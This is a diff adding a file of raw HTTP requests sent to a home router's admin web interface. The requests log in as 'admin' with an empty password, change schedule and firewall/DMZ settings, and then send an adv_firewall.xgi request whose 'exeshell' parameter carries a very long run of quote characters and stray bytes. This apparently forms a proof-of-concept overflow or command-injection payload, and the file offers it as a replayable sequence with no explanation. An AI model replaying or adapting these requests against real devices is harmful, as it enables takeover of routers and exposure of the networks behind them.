@@ -1,0 +1,93 @@
+GET / HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Sec-Purpose: prefetch;prerender
+Purpose: prefetch
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+POST /login.php HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Content-Length: 63
+Cache-Control: max-age=0
+Origin: http://192.168.0.1
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+ACTION_POST=LOGIN&LOGIN_USER=admin&LOGIN_PASSWD=&login=+Log+In+POST /tools_sch.php HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Content-Length: 206
+Cache-Control: max-age=0
+Origin: http://192.168.0.1
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/tools_sch.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+ACTION_POST=1&sch_time_start=02%3A00&sch_time_end=10%3A00&save_id=1&unique_id=1&apply=Save+Settings&sch_name=efawefdawwwww&week_or_days=0&day1=1&day2=1&s_hr=2&s_min=00&s_am_pm=am&e_hr=10&e_min=00&e_am_pm=amGET /tools_sch.xgi?random_num=2025.5.22.15.44.55&exeshell=submit%20COMMIT HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/tools_sch.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+POST /adv_firewall.php HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Content-Length: 767
+Cache-Control: max-age=0
+Origin: http://192.168.0.1
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/adv_firewall.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+ACTION_POST=SOMETHING&spi_enable=1&dmz_enable=1&dmz_ipaddr=13.63.11.1&dhcp=0&schedule_1=0&schedule_2=0&schedule_3=0&schedule_4=0&schedule_5=0&schedule_6=0&schedule_7=0&schedule_8=0&schedule_9=0&schedule_10=0&schedule_11=0&schedule_12=0&schedule_13=0&schedule_14=0&schedule_15=0&schedule_16=0&schedule_17=0&schedule_18=0&schedule_19=0&schedule_20=0&schedule_21=0&schedule_22=0&schedule_23=0&schedule_24=0&schedule_25=0&schedule_26=0&schedule_27=0&schedule_28=0&schedule_29=0&schedule_30=0&schedule_31=0&schedule_32=0&schedule_33=0&schedule_34=0&schedule_35=0&schedule_36=0&schedule_37=0&schedule_38=0&schedule_39=0&schedule_40=0&schedule_41=0&schedule_42=0&schedule_43=0&schedule_44=0&schedule_45=0&schedule_46=0&schedule_47=0&schedule_48=0&schedule_49=0&schedule_50=0GET /adv_firewall.xgi?random_num=2025.5.22.15.45.32&exeshell=submit%20COMMIT&exeshell=submit%20RG_DMZ&exeshell=submit%20"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""":""ñ"""""""(""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""ÍG_MISC HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/adv_firewall.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+GET /adv_firewall.php?uptime=234&random_num=2025.5.22.15.45.32 HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/adv_firewall.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+GET /model/__ajax_wan_conninfo.php?r=2025.5.22.15.45.47 HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: */*
+Referer: http://192.168.0.1/adv_firewall.php?uptime=234&random_num=2025.5.22.15.45.32
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
